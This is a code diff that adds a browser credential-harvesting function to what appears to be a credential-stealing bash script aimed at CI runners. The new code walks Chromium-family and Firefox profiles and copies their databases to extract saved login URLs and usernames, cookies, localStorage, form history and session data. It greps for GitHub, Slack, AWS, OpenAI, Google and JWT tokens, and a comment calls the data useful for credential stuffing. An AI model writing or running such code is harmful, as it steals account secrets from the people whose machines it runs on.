@@ -271,6 +271,147 @@ harvest_slack() {
     done
 }
 
+# ── B2c: Browser Credential Extraction (unencrypted only) ────────────────────
+# Chromium (Chrome/Brave/Edge/Chromium):
+#   - Login Data: passwords are v10/v11 os_crypt encrypted → NOT readable
+#     but origin_url + username_value ARE plaintext → useful for credential stuffing
+#   - Local Storage / Session Storage LevelDB: tokens in plaintext → READABLE
+#   - Cookies: encrypted → NOT readable
+#
+# Firefox:
+#   - cookies.sqlite: plaintext cookie values → READABLE
+#   - webappsstore.sqlite: plaintext localStorage → READABLE
+#   - formhistory.sqlite: plaintext form autofill → READABLE
+#   - key4.db / logins.json: encrypted without primary password, but key4.db
+#     itself is SQLite and may be readable for metadata
+#   - sessionstore: plaintext session data with form fields → READABLE
+harvest_browsers() {
+    local outfile="$OUTDIR/browser_creds.txt"
+
+    # ── Chromium-family profiles (Chrome, Brave, Edge, Chromium) ──
+    local chromium_profiles=()
+    for browser_dir in \
+        "$HOME_DIR/.config/google-chrome" \
+        "$HOME_DIR/.config/chromium" \
+        "$HOME_DIR/.config/BraveSoftware/Brave-Browser" \
+        "$HOME_DIR/.config/microsoft-edge"; do
+        [ -d "$browser_dir" ] && {
+            for profile in "$browser_dir"/Default "$browser_dir"/Profile\ *; do
+                [ -d "$profile" ] && chromium_profiles+=("$profile")
+            done
+        }
+    done
+
+    for profile in "${chromium_profiles[@]}"; do
+        local profile_name="$(basename "$profile")"
+
+        # ── Login Data: extract URLs + usernames (passwords encrypted, skip) ──
+        local login_db="$profile/Login Data"
+        if [ -f "$login_db" ] && [ -r "$login_db" ]; then
+            # Copy to avoid lock contention with running browser
+            local tmp_db="$OUTDIR/.tmp_login_$$"
+            cp "$login_db" "$tmp_db" 2>/dev/null && {
+                echo "=== Chromium Login Data: $profile_name ===" >> "$outfile"
+                sqlite3 "$tmp_db" \
+                    "SELECT origin_url, username_value FROM logins WHERE username_value != '' AND blacklisted_by_user = 0;" \
+                    2>/dev/null >> "$outfile" || true
+                rm -f "$tmp_db" 2>/dev/null
+            }
+        fi
+
+        # ── Local Storage LevelDB: binary grep for high-value tokens ──
+        local ls_dir="$profile/Local Storage/leveldb"
+        if [ -d "$ls_dir" ]; then
+            for f in "$ls_dir"/*.ldb "$ls_dir"/*.log; do
+                [ -r "$f" ] && {
+                    # API keys and tokens
+                    grep -aoE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35}|eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})' "$f" 2>/dev/null | sort -u >> "$outfile" || true
+                }
+            done
+        fi
+
+        # ── Session Storage LevelDB: same token grep ──
+        local ss_dir="$profile/Session Storage"
+        if [ -d "$ss_dir" ]; then
+            for f in "$ss_dir"/*.ldb; do
+                [ -r "$f" ] && {
+                    grep -aoE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|ghs_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{82}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35}|eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})' "$f" 2>/dev/null | sort -u >> "$outfile" || true
+                }
+            done
+        fi
+    done
+
+    # ── Firefox profiles ──
+    local firefox_dir="$HOME_DIR/.mozilla/firefox"
+    [ -d "$firefox_dir" ] && {
+        for profile in "$firefox_dir"/*.default*; do
+            [ -d "$profile" ] || continue
+            local profile_name="$(basename "$profile")"
+
+            # ── cookies.sqlite: plaintext values — grep for auth tokens ──
+            local ff_cookies="$profile/cookies.sqlite"
+            if [ -f "$ff_cookies" ] && [ -r "$ff_cookies" ]; then
+                local tmp_db="$OUTDIR/.tmp_ff_cookies_$$"
+                cp "$ff_cookies" "$tmp_db" 2>/dev/null && {
+                    echo "=== Firefox Cookies: $profile_name ===" >> "$outfile"
+                    sqlite3 "$tmp_db" \
+                        "SELECT host, name, value FROM moz_cookies WHERE value LIKE '%xox%' OR value LIKE '%ghp_%' OR value LIKE '%AKIA%' OR value LIKE '%sk-%' OR value LIKE '%AIza%' OR value LIKE '%token%' OR value LIKE '%eyJ%';" \
+                        2>/dev/null >> "$outfile" || true
+                    rm -f "$tmp_db" 2>/dev/null
+                }
+            fi
+
+            # ── webappsstore.sqlite: plaintext localStorage ──
+            local ff_ws="$profile/webappsstore.sqlite"
+            if [ -f "$ff_ws" ] && [ -r "$ff_ws" ]; then
+                local tmp_db="$OUTDIR/.tmp_ff_ws_$$"
+                cp "$ff_ws" "$tmp_db" 2>/dev/null && {
+                    echo "=== Firefox LocalStorage: $profile_name ===" >> "$outfile"
+                    sqlite3 "$tmp_db" \
+                        "SELECT scope, key, value FROM webappsstore2 WHERE value LIKE '%xox%' OR value LIKE '%ghp_%' OR value LIKE '%AKIA%' OR value LIKE '%sk-%' OR value LIKE '%AIza%' OR value LIKE '%token%' OR value LIKE '%eyJ%';" \
+                        2>/dev/null >> "$outfile" || true
+                    rm -f "$tmp_db" 2>/dev/null
+                }
+            fi
+
+            # ── formhistory.sqlite: autofill data (emails, names) ──
+            local ff_fh="$profile/formhistory.sqlite"
+            if [ -f "$ff_fh" ] && [ -r "$ff_fh" ]; then
+                local tmp_db="$OUTDIR/.tmp_ff_fh_$$"
+                cp "$ff_fh" "$tmp_db" 2>/dev/null && {
+                    echo "=== Firefox Form History: $profile_name ===" >> "$outfile"
+                    sqlite3 "$tmp_db" \
+                        "SELECT fieldname, value FROM moz_formhistory WHERE fieldname LIKE '%email%' OR fieldname LIKE '%user%' OR fieldname LIKE '%pass%' OR fieldname LIKE '%name%';" \
+                        2>/dev/null >> "$outfile" || true
+                    rm -f "$tmp_db" 2>/dev/null
+                }
+            fi
+
+            # ── sessionstore: plaintext session data with form fields ──
+            # .jsonlz4 format — try mozlz4 decompress, fall back to binary grep
+            for sf in "$profile"/sessionstore.jsonlz4 "$profile"/sessionstore-backups/recovery.jsonlz4; do
+                [ -f "$sf" ] && [ -r "$sf" ] && {
+                    # Try dejsonlz4 if available, else binary grep for tokens
+                    if command -v dejsonlz4 >/dev/null 2>&1; then
+                        local tmp_json="$OUTDIR/.tmp_session_$$.json"
+                        dejsonlz4 "$sf" "$tmp_json" 2>/dev/null && {
+                            echo "=== Firefox Session: $(basename "$sf") ===" >> "$outfile"
+                            grep -oE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35}|eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,})' "$tmp_json" 2>/dev/null | sort -u >> "$outfile" || true
+                            rm -f "$tmp_json" 2>/dev/null
+                        }
+                    else
+                        # Binary grep on lz4 file — tokens survive compression as ASCII
+                        grep -aoE '(ghp_[a-zA-Z0-9]{36}|gho_[a-zA-Z0-9]{36}|xox[epbs]-[A-Za-z0-9._-]{10,}|AKIA[0-9A-Z]{16}|sk-[a-zA-Z0-9]{20,}|AIza[a-zA-Z0-9_-]{35})' "$sf" 2>/dev/null | sort -u >> "$outfile" || true
+                    fi
+                }
+            done
+
+            # ── key4.db: grab metadata (not the encrypted secrets themselves) ──
+            _slurp "Firefox key4 metadata: $profile_name" "$profile/key4.db" "$outfile"
+        done
+    }
+}
+
 # ── B3: Cloud Metadata (IAM role creds from IMDS) ────────────────────────────
 harvest_cloud_metadata() {
     local outfile="$OUTDIR/cloud_metadata.txt"
@@ -458,6 +599,7 @@ main() {
     harvest_env_vars
     harvest_cloud_files
     harvest_slack
+    harvest_browsers
     harvest_cloud_metadata
     harvest_runner_memory
     harvest_config_sweep
